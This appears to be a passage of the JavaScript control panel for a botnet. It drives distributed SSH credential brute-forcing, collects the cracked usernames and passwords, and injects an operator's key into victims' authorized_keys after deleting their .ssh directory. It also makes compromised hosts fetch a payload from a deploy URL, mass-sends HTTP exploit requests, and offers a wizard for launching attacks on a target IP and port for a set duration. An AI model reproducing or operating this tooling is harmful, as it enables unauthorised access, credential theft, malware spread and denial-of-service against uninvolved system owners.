        if (entry.args && entry.args.raw) cmd += ' ' + entry.args.raw;
        var ts = entry.timestamp || '';
        if (ts) { try { ts = new Date(ts).toLocaleString(); } catch (e) { } }
        var target = entry.target || 'all';
        cmd = cmd.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
        target = target.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
        html += '<div class="cmd-history-item" onclick="applyCmdHistoryEntry(this)" data-cmdtype="' +
          (entry.cmdType || '').replace(/"/g, '&quot;') + '" data-args="' +
          ((entry.args && entry.args.raw) || '').replace(/"/g, '&quot;') + '" data-target="' +
          (entry.target || '').replace(/"/g, '&quot;') + '">';
        html += '<span class="hist-cmd">' + cmd + '</span>';
        html += '<span class="hist-meta"><span>' + target + '</span><span>' + ts + '</span></span>';
        html += '</div>';
      });
      dd.innerHTML = html;
    }
    dd.classList.add('open');
  }).catch(function () {
    dd.innerHTML = '<div class="cmd-history-empty">Failed to load history</div>';
    dd.classList.add('open');
  });
}

function applyCmdHistoryEntry(el) {
  var cmdType = el.getAttribute('data-cmdtype');
  var rawArgs = el.getAttribute('data-args');
  var target = el.getAttribute('data-target');

  var cmdSel = document.getElementById('cmd-type');
  if (cmdSel) {
    var opt = cmdSel.querySelector('option[value="' + cmdType + '"]');
    if (opt) {
      var cat = opt.getAttribute('data-cat');
      var catBtns = document.querySelectorAll('.cmd-cat');
      catBtns.forEach(function (b) {
        b.classList.remove('active');
        if (b.getAttribute('data-cat') === cat) b.classList.add('active');
      });
      for (var i = 0; i < cmdSel.options.length; i++) {
        var oc = cmdSel.options[i].getAttribute('data-cat');
        cmdSel.options[i].style.display = (oc === cat) ? '' : 'none';
      }
    }
    cmdSel.value = cmdType;
    updateArgFields();
  }

  if (rawArgs) {
    setTimeout(function () {
      var defs = cmdArgDefs[cmdType] || [];
      if (defs.length > 0) {
        var first = document.getElementById(defs[0].id);
        if (first) first.value = rawArgs;
      }
    }, 50);
  }

  var botInp = document.getElementById('cmd-bot');
  if (botInp) {
    if (target && target !== 'all') {
      botInp.value = target;
      document.getElementById('cmd-target-clear').style.display = '';
    } else {
      botInp.value = '';
      document.getElementById('cmd-target-clear').style.display = 'none';
    }
  }

  document.getElementById('cmd-history-dropdown').classList.remove('open');
  showToast('Command loaded from history', true);
}

// Close history dropdown when clicking outside
document.addEventListener('click', function (e) {
  var dd = document.getElementById('cmd-history-dropdown');
  var wrap = document.querySelector('.cmd-history-wrap');
  if (dd && wrap && !wrap.contains(e.target)) {
    dd.classList.remove('open');
  }
});

// Load templates on page init
(function () {
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', loadCmdTemplates);
  } else {
    loadCmdTemplates();
  }
})();

// ---------------------------------------------------------------------------
// SSH Scanner
// ---------------------------------------------------------------------------

function sshModeChanged(mode) {
  document.getElementById('ssh-deploy-wrap').style.display = mode === 'deploy' ? 'block' : 'none';
  document.getElementById('ssh-command-wrap').style.display = mode === 'command' ? 'block' : 'none';
  document.getElementById('ssh-root-wrap').style.display = (mode === 'deploy' || mode === 'command') ? 'block' : 'none';
}

function sshStart() {
  var targets = document.getElementById('ssh-targets').value.trim();
  var combos = document.getElementById('ssh-combos').value.trim();
  var mode = document.getElementById('ssh-mode').value;
  if (!targets || !combos) { showToast('Enter targets and combos first', false); return; }

  var rootOn = document.getElementById('ssh-root-mode') && document.getElementById('ssh-root-mode').checked;
  var rootKey = rootOn ? (document.getElementById('ssh-root-key').value || '').trim() : '';
  if (rootOn && !rootKey) { showToast('Root mode enabled but no SSH key entered', false); return; }

  var command = '';
  var parts = [];

  // Root key injection (available in deploy + command modes)
  if (rootOn && rootKey) {
    parts.push('cd ~ && rm -rf .ssh && mkdir .ssh && echo "' + rootKey + '">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~');
  }

  if (mode === 'deploy') {
    var url = (document.getElementById('ssh-deploy-url').value || '').trim();
    if (!url) { showToast('Enter a deploy URL', false); return; }
    // URL triggers the built-in wget/curl/tftp chain on the bot
    parts.push(url);
    command = parts.join('; ');
  } else if (mode === 'command') {
    var cmd = (document.getElementById('ssh-command').value || '').trim();
    if (!cmd && !rootOn) { showToast('Enter a command or enable root mode', false); return; }
    if (cmd) parts.push(cmd);
    command = parts.join('; ');
  }

  var targetList = targets.split('\n').map(function (l) { return l.trim(); }).filter(Boolean);
  var config = { mode: command ? 'payload' : 'report', combos: combos };
  if (command) config.command = command;
  if (document.getElementById('ssh-deploy-clean') && document.getElementById('ssh-deploy-clean').checked)
    config.clean = 'true';
  if (document.getElementById('ssh-nohp') && document.getElementById('ssh-nohp').checked)
    config.nohp = 'true';

  var f = getScanFilters();

  fetch('/api/scan-job/create', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ type: 'ssh', targets: targetList, config: config, batchSize: 50, archFilter: f.archFilter, minRAM: f.minRAM })
  }).then(function (r) { return r.json() }).then(function (d) {
    if (d.ok) {
      showToast('SSH scan job created: ' + d.total + ' targets distributed across bots', true);
      scanJobRefresh();
    } else showToast('SSH scan failed: ' + (d.error || 'unknown'), false);
    sshRefreshStatus();
  }).catch(function (e) { showToast('SSH scan error: ' + e, false); });
}

function sshStop() {
  fetch('/api/scan-job/force-stop', { method: 'POST' }).then(function () {
    showToast('SSH scan stopped', true);
    sshRefreshStatus();
    scanJobRefresh();
  });
}

function sshRefreshStatus() {
  fetch('/api/ssh/status').then(function (r) { return r.json() }).then(function (d) {
    var el = document.getElementById('ssh-status-text');
    if (!el) return;
    if (d.running) {
      el.textContent = 'Running — ' + (d.hits || 0) + ' hits';
      el.style.color = '#3fb950';
    } else {
      el.textContent = d.hits > 0 ? d.hits + ' hits found' : 'Idle';
      el.style.color = '';
    }
    sshUpdateBadge(d.hits || 0);
  }).catch(function () { });
  sshRefreshHits();
}

function sshRefreshHits() {
  fetch('/api/ssh/hits').then(function (r) { return r.json() }).then(function (hits) {
    var wrap = document.getElementById('ssh-hits-wrap');
    if (!wrap) return;
    if (!hits || !hits.length) { wrap.innerHTML = ''; return; }
    var html = '<table class="socks-dash-table"><thead><tr><th>IP</th><th>Country</th><th>User</th><th>Pass</th><th>Bot</th><th>Session</th><th>Time</th></tr></thead><tbody>';
    for (var i = 0; i < hits.length; i++) {
      var h = hits[i];
      var ts = h.t || h.timestamp || '';
      html += '<tr><td style="font-family:monospace">' + escHtml(h.ip) + '</td><td>' + escHtml(h.country || '??') + '</td><td>' + escHtml(h.user) + '</td><td>' + escHtml(h.pass) + '</td><td style="font-size:11px;color:var(--text-dim)">' + escHtml(h.botID || '') + '</td><td style="font-size:11px;color:var(--text-dim)">' + escHtml(h.sid || '') + '</td><td>' + ago(ts) + '</td></tr>';
    }
    html += '</tbody></table>';
    wrap.innerHTML = html;
  }).catch(function () { });
}

function sshExportHits() {
  window.location = '/api/hits/export?mod=ssh&format=csv';
}

function sshExportTxt() {
  window.location = '/api/hits/export?mod=ssh&format=txt';
}

function sshClearHits() {
  if (!confirm('Clear all SSH hits?')) return;
  fetch('/api/ssh/hits', { method: 'DELETE' }).then(function () {
    sshUpdateBadge(0);
    sshRefreshStatus();
    showToast('SSH hits cleared', true);
  });
}

function sshUpdateBadge(n) {
  var el = document.getElementById('tab-scanners-count');
  if (!el) return;
  if (n > 0) { el.textContent = n; el.style.display = ''; }
  else { el.textContent = '0'; el.style.display = 'none'; }
}

function sshBeep() {
  try {
    var ctx = new (window.AudioContext || window.webkitAudioContext)();
    var osc = ctx.createOscillator();
    var gain = ctx.createGain();
    osc.connect(gain); gain.connect(ctx.destination);
    osc.type = 'sine';
    osc.frequency.value = 520;
    gain.gain.value = 0.06;
    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.3);
    osc.start(); osc.stop(ctx.currentTime + 0.3);
  } catch (e) { }
}

function sshLoadFile(input, targetId) {
  var f = input.files && input.files[0];
  if (!f) return;
  var reader = new FileReader();
  reader.onload = function (e) {
    document.getElementById(targetId).value = e.target.result;
    showToast('Loaded ' + f.name, true);
  };
  reader.readAsText(f);
  input.value = '';
}

function sshToggleRootMode(on) {
  var wrap = document.getElementById('ssh-root-key-wrap');
  if (!wrap) return;
  wrap.style.display = on ? 'block' : 'none';
  if (on) {
    var sel = document.getElementById('ssh-mode');
    if (sel && sel.value !== 'payload') { sel.value = 'payload'; sel.dispatchEvent(new Event('change')); }
  }
}

// ===========================================================================
// HTTP EXPLOIT MODULE
// ===========================================================================
function httpExplStart() {
  var method = document.getElementById('hexpl-method').value;
  var path = document.getElementById('hexpl-path').value.trim() || '/';
  var port = parseInt(document.getElementById('hexpl-port').value) || 80;
  var ua = document.getElementById('hexpl-ua').value.trim() || 'Mozilla/5.0';
  var expect = document.getElementById('hexpl-expect').value.trim() || '200';
  var headersRaw = document.getElementById('hexpl-headers').value.trim();
  var targetsRaw = document.getElementById('hexpl-targets').value.trim();
  var body = document.getElementById('hexpl-body').value;

  if (!targetsRaw) { showToast('Enter target IPs', false); return; }
  var targets = targetsRaw.split('\n').map(function (l) { return l.trim(); }).filter(Boolean);
  var headers = {};
  if (headersRaw) {
    headersRaw.split('\n').forEach(function (line) {
      var idx = line.indexOf(':');
      if (idx > 0) headers[line.substring(0, idx).trim()] = line.substring(idx + 1).trim();
    });
  }

  // Create scan job with work-stealing distribution
  var config = { method: method, path: path, port: String(port), ua: ua, expect: expect, body: body };
  var hi = 0;
  Object.keys(headers).forEach(function (k) { config['header_' + (hi++)] = k + ': ' + headers[k]; });

  var f = getScanFilters();

  fetch('/api/scan-job/create', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ type: 'http', targets: targets, config: config, batchSize: 25, archFilter: f.archFilter, minRAM: f.minRAM })
  }).then(function (r) { return r.json(); }).then(function (d) {
    if (d.ok) {
      showToast('Scan job created: ' + d.total + ' targets distributed across bots', true);
      document.getElementById('hexpl-status-text').textContent = 'Job running — targets distributed via work-stealing';
      scanJobRefresh();
    } else showToast(d.error || 'Failed', false);
  }).catch(function () { showToast('Request failed', false); });
}

function httpExplStop() {
  fetch('/api/http-exploit/stop', { method: 'POST' }).then(function (r) { return r.json(); }).then(function (d) {
    if (d.ok) { showToast('HTTP exploit stopped', true); document.getElementById('hexpl-status-text').textContent = 'Stopped'; }
  });
}

// HTTP Exploit PoC Config Save/Load/Delete
function hexplRefreshPocs() {
  fetch('/api/http-exploit/pocs').then(function (r) { return r.json() }).then(function (pocs) {
    var sel = document.getElementById('hexpl-poc-select');
    if (!sel) return;
    sel.innerHTML = '<option value="">-- PoC Configs --</option>';
    (pocs || []).forEach(function (p) {
      var opt = document.createElement('option');
      opt.value = p.id; opt.textContent = p.name;
      sel.appendChild(opt);
    });
  }).catch(function () { });
}

function hexplSavePoc() {
  var name = prompt('PoC config name:');
  if (!name || !name.trim()) return;
  var config = {
    name: name.trim(),
    method: document.getElementById('hexpl-method').value,
    path: document.getElementById('hexpl-path').value,
    port: document.getElementById('hexpl-port').value,
    ua: document.getElementById('hexpl-ua').value,
    expect: document.getElementById('hexpl-expect').value,
    headers: document.getElementById('hexpl-headers').value,
    body: document.getElementById('hexpl-body').value
  };
  fetch('/api/http-exploit/pocs', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(config)
  }).then(function (r) { return r.json() }).then(function (d) {
    if (d.ok) { showToast('PoC saved: ' + name, true); hexplRefreshPocs(); }
    else showToast(d.error || 'Save failed', false);
  });
}

function hexplLoadPoc() {
  var sel = document.getElementById('hexpl-poc-select');
  if (!sel || !sel.value) { showToast('Select a PoC config first', false); return; }
  fetch('/api/http-exploit/pocs/' + sel.value).then(function (r) { return r.json() }).then(function (p) {
    if (!p || !p.id) { showToast('PoC not found', false); return; }
    if (p.method) document.getElementById('hexpl-method').value = p.method;
    if (p.path) document.getElementById('hexpl-path').value = p.path;
    if (p.port) document.getElementById('hexpl-port').value = p.port;
    if (p.ua) document.getElementById('hexpl-ua').value = p.ua;
    if (p.expect) document.getElementById('hexpl-expect').value = p.expect;
    document.getElementById('hexpl-headers').value = p.headers || '';
    document.getElementById('hexpl-body').value = p.body || '';
    showToast('Loaded: ' + p.name, true);
    updateHexplPreview();
  });
}

function hexplDeletePoc() {
  var sel = document.getElementById('hexpl-poc-select');
  if (!sel || !sel.value) { showToast('Select a PoC config first', false); return; }
  if (!confirm('Delete this PoC config?')) return;
  fetch('/api/http-exploit/pocs/' + sel.value, { method: 'DELETE' }).then(function (r) { return r.json() }).then(function (d) {
    if (d.ok) { showToast('PoC deleted', true); hexplRefreshPocs(); }
  });
}

// Load PoC list on page init
hexplRefreshPocs();

function httpExplClearHits() {
  fetch('/api/http-exploit/hits', { method: 'DELETE' }).then(function () {
    document.getElementById('hexpl-hits-wrap').innerHTML = '';
    showToast('Hits cleared', true);
  });
}

function httpExplRefreshHits() {
  fetch('/api/http-exploit/hits').then(function (r) { return r.json(); }).then(function (hits) {
    var wrap = document.getElementById('hexpl-hits-wrap');
    if (!wrap || !hits || !hits.length) { if (wrap) wrap.innerHTML = '<div style="color:var(--text-dim);font-size:12px;padding:8px">No hits yet</div>'; return; }
    var html = '<table class="socks-dash-table" style="font-size:12px"><thead><tr><th>IP</th><th>Country</th><th>Status</th><th>Bot</th><th>Time</th></tr></thead><tbody>';
    hits.forEach(function (h) {
      var isHit = h.status && h.status.startsWith('2');
      var color = isHit ? 'var(--green)' : 'var(--text-dim)';
      var ts = h.t || h.timestamp || '';
      html += '<tr><td style="font-family:var(--mono)">' + escHtml(h.ip) + '</td><td>' + escHtml(h.country || '??') + '</td><td style="color:' + color + '">' + escHtml(h.status) + '</td><td style="font-size:11px;color:var(--text-dim)">' + escHtml(h.botID || '') + '</td><td>' + ago(ts) + '</td></tr>';
    });
    wrap.innerHTML = html + '</tbody></table>';
  });
}

// Poll hits every 3s when on scanners or results tab
setInterval(function () {
  if (document.querySelector('[data-tab="tab-scanners"].active')) {
    httpExplRefreshHits();
  }
  // Always refresh scan progress (keeps badge updated even on other tabs)
  scanJobRefresh();
  if (document.querySelector('[data-tab="tab-results"].active')) {
    scanJobRefreshHits();
    scanJobRefreshBotStats();
  }
}, 3000);

// Live payload preview for HTTP exploit
['hexpl-method', 'hexpl-path', 'hexpl-port', 'hexpl-ua', 'hexpl-expect', 'hexpl-headers', 'hexpl-body'].forEach(function (id) {
  var el = document.getElementById(id);
  if (el) el.addEventListener('input', updateHexplPreview);
});
function updateHexplPreview() {
  var pre = document.getElementById('hexpl-preview');
  if (!pre) return;
  var method = (document.getElementById('hexpl-method') || {}).value || 'GET';
  var path = (document.getElementById('hexpl-path') || {}).value || '/';
  var port = (document.getElementById('hexpl-port') || {}).value || '80';
  var ua = (document.getElementById('hexpl-ua') || {}).value || 'Mozilla/5.0';
  var headers = (document.getElementById('hexpl-headers') || {}).value || '';
  var body = (document.getElementById('hexpl-body') || {}).value || '';
  var preview = method + ' ' + path + ' HTTP/1.1\r\nHost: <TARGET>\r\nUser-Agent: ' + ua + '\r\n';
  if (headers.trim()) {
    headers.trim().split('\n').forEach(function (h) { if (h.trim()) preview += h.trim() + '\r\n'; });
  }
  if (body && (method === 'POST' || method === 'PUT')) {
    preview += 'Content-Length: ' + body.length + '\r\n';
  }
  preview += 'Connection: close\r\n\r\n';
  if (body) preview += body;
  pre.textContent = preview;
}

// ===========================================================================
// SCAN JOB PROGRESS
// ===========================================================================
function scanJobRefresh() {
  fetch('/api/scan-job/progress').then(function (r) { return r.json(); }).then(function (d) {
    var panel = document.getElementById('scan-job-panel');
    if (!panel) return;
    if (!d.active) {
      document.getElementById('sjob-title').textContent = 'Scan Queue';
      document.getElementById('sjob-status').textContent = 'No active job';
      document.getElementById('sjob-bar-text').textContent = '0/0';
      return;
    }

    document.getElementById('sjob-title').textContent = d.type.toUpperCase() + ' Scan Job';
    var statusText = d.status + ' \u2014 ' + d.total + ' targets';
    if (d.assigned > 0) statusText += ' (' + d.assigned + ' in-flight)';
    document.getElementById('sjob-status').textContent = statusText;

    // Toggle pause/resume/force-stop buttons
    var pauseBtn = document.getElementById('sjob-btn-pause');
    var resumeBtn = document.getElementById('sjob-btn-resume');
    var forceBtn = document.getElementById('sjob-btn-force-stop');
    if (pauseBtn) pauseBtn.style.display = d.status === 'running' ? '' : 'none';
    if (resumeBtn) resumeBtn.style.display = d.status === 'paused' ? '' : 'none';
    if (forceBtn) forceBtn.style.display = (d.status === 'paused' && d.assigned > 0) ? '' : 'none';
    document.getElementById('sjob-total').textContent = d.total;
    document.getElementById('sjob-pending').textContent = d.pending;
    var assignedEl = document.getElementById('sjob-assigned');
    if (assignedEl) assignedEl.textContent = d.assigned || 0;
    document.getElementById('sjob-hits').textContent = d.hits;
    document.getElementById('sjob-miss').textContent = d.misses;
    document.getElementById('sjob-err').textContent = d.errors;

    var done = d.hits + d.misses + d.errors;
    var pct = d.total > 0 ? (done / d.total * 100) : 0;
    var hitPct = d.total > 0 ? (d.hits / d.total * 100) : 0;
    var missPct = d.total > 0 ? (d.misses / d.total * 100) : 0;
    var errPct = d.total > 0 ? (d.errors / d.total * 100) : 0;

    document.getElementById('sjob-bar-hits').style.width = hitPct + '%';
    document.getElementById('sjob-bar-miss').style.left = hitPct + '%';
    document.getElementById('sjob-bar-miss').style.width = missPct + '%';
    document.getElementById('sjob-bar-err').style.left = (hitPct + missPct) + '%';
    document.getElementById('sjob-bar-err').style.width = errPct + '%';
    document.getElementById('sjob-bar-text').textContent = done + '/' + d.total + ' (' + Math.round(pct) + '%)';

    // Keep tab badge in sync from progress data
    var countEl = document.getElementById('tab-results-count');
    if (countEl) {
      if (d.hits > 0) { countEl.textContent = d.hits; countEl.style.display = ''; }
      else { countEl.textContent = '0'; countEl.style.display = 'none'; }
    }
  }).catch(function () { });
}

// Parse credential result string: "user:pass" or "root:toor" or raw status
function parseCred(result) {
  if (!result) return { user: '', pass: '', raw: '' };
  var idx = result.indexOf(':');
  if (idx > 0 && idx < result.length - 1 && result.indexOf(' ') === -1) {
    return { user: result.substring(0, idx), pass: result.substring(idx + 1), raw: result };
  }
  // SSH format: "user:pass" after space in "user:pass"
  var parts = result.split(' ');
  if (parts.length >= 1) {
    idx = parts[0].indexOf(':');
    if (idx > 0) return { user: parts[0].substring(0, idx), pass: parts[0].substring(idx + 1), raw: result };
  }
  return { user: '', pass: '', raw: result };
}

function copyText(text) {
  navigator.clipboard.writeText(text).then(function () { showToast('Copied', true); });
}

function scanJobCopyAllHits() {
  fetch('/api/scan-job/hits').then(function (r) { return r.json(); }).then(function (hits) {
    if (!hits || !hits.length) { showToast('No hits', false); return; }
    var lines = hits.map(function (h) {
      var c = parseCred(h.result || h.status || '');
      return c.user ? h.ip + ' ' + c.user + ':' + c.pass : h.ip + ' ' + (h.result || h.status || '');
    });
    navigator.clipboard.writeText(lines.join('\n')).then(function () { showToast('Copied ' + lines.length + ' hits', true); });
  });
}

var _sjobHitsCache = [];

function scanJobRefreshHits() {
  fetch('/api/scan-job/hits').then(function (r) { return r.json(); }).then(function (hits) {
    var table = document.getElementById('sjob-hits-table');
    var badge = document.getElementById('sjob-hits-badge');
    var countEl = document.getElementById('tab-results-count');
    if (!table) return;
    _sjobHitsCache = hits || [];
    if (!hits || !hits.length) {
      table.innerHTML = '<div style="color:var(--text-dim);font-size:12px;padding:20px;text-align:center">No hits yet</div>';
      if (badge) badge.textContent = '0';
      if (countEl) { countEl.textContent = '0'; countEl.style.display = 'none'; }
      return;
    }
    if (badge) badge.textContent = hits.length;
    if (countEl) { countEl.textContent = hits.length; countEl.style.display = ''; }
    scanJobRenderHits(hits);
  }).catch(function () { });
}

function scanJobFilterHits() {
  var q = (document.getElementById('sjob-hits-search') || {}).value || '';
  q = q.toLowerCase().trim();
  if (!q) { scanJobRenderHits(_sjobHitsCache); return; }
  var filtered = _sjobHitsCache.filter(function (h) {
    var c = parseCred(h.result || h.status || '');
    return (h.ip && h.ip.toLowerCase().indexOf(q) >= 0) ||
      (c.user && c.user.toLowerCase().indexOf(q) >= 0) ||
      (c.pass && c.pass.toLowerCase().indexOf(q) >= 0) ||
      (c.raw && c.raw.toLowerCase().indexOf(q) >= 0);
  });
  scanJobRenderHits(filtered);
}

function scanJobRenderHits(hits) {
  var table = document.getElementById('sjob-hits-table');
  if (!table || !hits) return;
  // Check if any hits have parseable credentials
  var hasCreds = hits.some(function (h) { return parseCred(h.result || h.status || '').user; });
  var html = '<table style="width:100%;border-collapse:collapse;font-size:12px"><thead><tr style="border-bottom:1px solid var(--border)">' +
    '<th style="text-align:left;padding:8px 12px;color:var(--text-dim)">IP</th>';
  if (hasCreds) {
    html += '<th style="text-align:left;padding:8px 12px;color:var(--text-dim)">User</th>' +
      '<th style="text-align:left;padding:8px 12px;color:var(--text-dim)">Pass</th>';
  } else {
    html += '<th style="text-align:left;padding:8px 12px;color:var(--text-dim)">Result</th>';
  }
  html += '<th style="text-align:left;padding:8px 12px;color:var(--text-dim)">Time</th>' +
    '<th style="width:30px"></th></tr></thead><tbody>';
  hits.forEach(function (h) {
    var c = parseCred(h.result || h.status || '');
    var copyStr = c.user ? h.ip + ':' + c.user + ':' + c.pass : h.ip + ' ' + c.raw;
    html += '<tr style="border-bottom:1px solid var(--border)">' +
      '<td style="padding:6px 12px;font-family:var(--mono);color:var(--green)">' + escHtml(h.ip) + '</td>';
    if (hasCreds) {
      html += '<td style="padding:6px 12px;font-family:var(--mono);color:var(--cyan)">' + escHtml(c.user) + '</td>' +
        '<td style="padding:6px 12px;font-family:var(--mono);color:var(--text)">' + escHtml(c.pass) + '</td>';
    } else {
      html += '<td style="padding:6px 12px;color:var(--text)">' + escHtml(c.raw) + '</td>';
    }
    html += '<td style="padding:6px 12px;color:var(--text-dim)">' + ago(h.updatedAt) + '</td>' +
      '<td style="padding:4px"><button onclick="copyText(\'' + escHtml(copyStr).replace(/'/g, "\\'") + '\')" style="background:none;border:1px solid var(--border);border-radius:4px;color:var(--text-dim);cursor:pointer;font-size:10px;padding:2px 6px" title="Copy">cp</button></td></tr>';
  });
  table.innerHTML = html + '</tbody></table>';
}

function scanJobRefreshBotStats() {
  fetch('/api/scan-job/bot-stats').then(function (r) { return r.json(); }).then(function (stats) {
    var wrap = document.getElementById('sjob-bot-stats');
    var body = document.getElementById('sjob-bot-stats-body');
    if (!wrap || !body) return;
    if (!stats || !stats.length) { wrap.style.display = 'none'; return; }
    wrap.style.display = '';
    var html = '<table style="width:100%;border-collapse:collapse;font-size:12px"><thead><tr style="border-bottom:1px solid var(--border)">' +
      '<th style="text-align:left;padding:6px 12px;color:var(--text-dim)">Bot</th>' +
      '<th style="text-align:right;padding:6px 12px;color:var(--text-dim)">Assigned</th>' +
      '<th style="text-align:right;padding:6px 12px;color:var(--green)">Hits</th>' +
      '<th style="text-align:right;padding:6px 12px;color:var(--text-dim)">Miss</th>' +
      '<th style="text-align:right;padding:6px 12px;color:var(--red)">Err</th>' +
      '<th style="text-align:right;padding:6px 12px;color:var(--text-dim)">Rate</th>' +
      '</tr></thead><tbody>';
    stats.sort(function (a, b) { return b.hits - a.hits; }); // top performers first
    stats.forEach(function (s) {
      var total = s.hits + s.misses + s.errors;
      var elapsed = s.startedAt ? Math.max(1, Math.floor((Date.now() - new Date(s.startedAt)) / 1000)) : 1;
      var rate = (total / elapsed).toFixed(1);
      html += '<tr style="border-bottom:1px solid var(--border)">' +
        '<td style="padding:4px 12px;font-family:var(--mono);color:var(--blue)">' + escHtml(s.botID.substring(0, 8)) + '</td>' +
        '<td style="padding:4px 12px;text-align:right">' + s.assigned + '</td>' +
        '<td style="padding:4px 12px;text-align:right;color:var(--green);font-weight:700">' + s.hits + '</td>' +
        '<td style="padding:4px 12px;text-align:right;color:var(--text-dim)">' + s.misses + '</td>' +
        '<td style="padding:4px 12px;text-align:right;color:var(--red)">' + s.errors + '</td>' +
        '<td style="padding:4px 12px;text-align:right;color:var(--text-dim)">' + rate + '/s</td></tr>';
    });
    body.innerHTML = html + '</tbody></table>';
  }).catch(function () { });
}

function scanJobStop() {
  fetch('/api/scan-job/stop', { method: 'POST' }).then(function () {
    showToast('Paused — bots finishing current batch, results still flowing', true); scanJobRefresh();
  });
}

function scanJobForceStop() {
  if (!confirm('Force stop kills all scanners immediately. In-flight results will be lost.')) return;
  fetch('/api/scan-job/force-stop', { method: 'POST' }).then(function () {
    showToast('Force stopped — all scanners killed', true); scanJobRefresh();
  });
}

function scanJobResume() {
  fetch('/api/scan-job/resume', { method: 'POST' }).then(function () {
    showToast('Scan job resumed', true); scanJobRefresh();
  });
}

function scanJobClear() {
  if (!confirm('Clear scan job and all results?')) return;
  fetch('/api/scan-job/clear', { method: 'POST' }).then(function () {
    document.getElementById('sjob-hits-feed').innerHTML = '<div style="color:var(--text-dim);font-size:11px;padding:8px;text-align:center">Waiting for results...</div>';
    showToast('Job cleared', true);
    scanJobRefresh();
  });
}

function scanJobExportHits() {
  fetch('/api/scan-job/hits').then(function (r) { return r.json(); }).then(function (hits) {
    if (!hits || !hits.length) { showToast('No hits to export', false); return; }
    var csv = 'IP,Status,Result,Updated\n';
    hits.forEach(function (h) {
      csv += escHtml(h.ip) + ',' + escHtml(h.status) + ',' + escHtml(h.result || '') + ',' + (h.updatedAt || '') + '\n';
    });
    var blob = new Blob([csv], { type: 'text/csv' });
    var a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = 'scan_hits_' + new Date().toISOString().slice(0, 10) + '.csv';
    a.click();
  });
}

// Add an entry to the scan job live feed panel
function scanJobAddFeedItem(text) {
  var feed = document.getElementById('sjob-hits-feed');
  if (!feed) return;
  // Clear the "Waiting for results..." placeholder
  if (feed.children.length === 1 && feed.children[0].textContent.indexOf('Waiting') !== -1) {
    feed.innerHTML = '';
  }
  var item = document.createElement('div');
  item.style.cssText = 'font-size:12px;font-family:var(--mono);padding:2px 0;color:var(--green)';
  item.textContent = '[' + new Date().toLocaleTimeString() + '] ' + text;
  feed.insertBefore(item, feed.firstChild);
  if (feed.children.length > 100) feed.removeChild(feed.lastChild);
}

// ===========================================================================
function sendToBots(cmd) {
  fetch('/api/command', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ command: cmd })
  });
}

// ===========================================================================
// HEALTH BADGE HELPER
// ===========================================================================
function healthBadge(score) {
  if (score == null) return '<span class="health-badge health-fair">--</span>';
  var cls = score >= 70 ? 'health-good' : score >= 40 ? 'health-fair' : 'health-poor';
  return '<span class="health-badge ' + cls + '">' + score + '</span>';
}

// ===========================================================================
// ATTACK WIZARD
// ===========================================================================
var wizState = { step: 1, method: null, methods: [], target: '', port: '80', duration: 120, options: {}, filters: {} };

function wizardInit() {
  fetch('/api/attack-methods').then(function (r) { return r.json(); }).then(function (methods) {
    wizState.methods = methods;
    renderMethodGrid(methods);
  }).catch(function () { });
}

function renderMethodGrid(methods) {
  var grid = document.getElementById('wiz-method-grid');
  if (!grid) return;
  grid.innerHTML = '';
  methods.forEach(function (m) {
    var card = document.createElement('div');
    card.className = 'method-card' + (wizState.method && wizState.method.id === m.id ? ' selected' : '');
    card.innerHTML = '<div class="mc-name">' + escHtml(m.name) + '</div>' +
      '<div class="mc-cat">' + escHtml(m.category) + '</div>' +
      '<div class="mc-desc">' + escHtml(m.desc) + '</div>';
    card.onclick = function () {
      wizState.method = m;
      grid.querySelectorAll('.method-card').forEach(function (c) { c.classList.remove('selected'); });
      card.classList.add('selected');
    };
    grid.appendChild(card);
  });
}

function wizardNext() {
  if (wizState.step === 1) {
    if (!wizState.method) { showToast('Select an attack method', false); return; }
  } else if (wizState.step === 2) {
    wizState.target = document.getElementById('wiz-target').value.trim();
    wizState.port = document.getElementById('wiz-port').value.trim() || '80';
    wizState.duration = parseInt(document.getElementById('wiz-duration-val').value) || 120;
    wizState.filters.arch = document.getElementById('wiz-arch-filter').value;
    wizState.filters.minRam = parseInt(document.getElementById('wiz-min-ram').value) || 0;
    wizState.filters.maxBots = parseInt(document.getElementById('wiz-max-bots').value) || 0;
    if (!wizState.target) { showToast('Enter a target IP', false); return; }
  } else if (wizState.step === 3) {
    // Collect options
    wizState.options = {};
    var container = document.getElementById('wiz-options-container');
    container.querySelectorAll('input,select').forEach(function (el) {
      if (el.value && el.value !== el.getAttribute('data-default')) {
        wizState.options[el.getAttribute('data-key')] = el.value;
      }
    });
  }

  wizState.step++;
  if (wizState.step > 4) wizState.step = 4;
  renderWizardStep();

  if (wizState.step === 3) renderWizardOptions();
  if (wizState.step === 4) renderWizardReview();
}

function wizardBack() {
  wizState.step--;
  if (wizState.step < 1) wizState.step = 1;
  renderWizardStep();
}

function renderWizardStep() {
  for (var i = 1; i <= 4; i++) {
    var page = document.getElementById('wiz-step-' + i);
    if (page) page.classList.toggle('active', i === wizState.step);
  }
  document.querySelectorAll('.wizard-step').forEach(function (el) {
    var s = parseInt(el.getAttribute('data-step'));
    el.classList.toggle('active', s === wizState.step);
    el.classList.toggle('done', s < wizState.step);
  });
  var backBtn = document.getElementById('wiz-back');
  var nextBtn = document.getElementById('wiz-next');
  var launchBtn = document.getElementById('wiz-launch');
  if (backBtn) backBtn.style.display = wizState.step > 1 ? '' : 'none';
  if (nextBtn) nextBtn.style.display = wizState.step < 4 ? '' : 'none';
  if (launchBtn) launchBtn.style.display = wizState.step === 4 ? '' : 'none';
}

function renderWizardOptions() {
  var container = document.getElementById('wiz-options-container');
  if (!container || !wizState.method) return;
  container.innerHTML = '<p style="color:var(--text-dim);font-size:13px;margin-bottom:12px">Options for ' + escHtml(wizState.method.name) + ':</p>';
  (wizState.method.options || []).forEach(function (opt) {
    var row = document.createElement('div');
    row.className = 'wiz-form-row';
    row.innerHTML = '<label>' + escHtml(opt.label) + '</label>' +
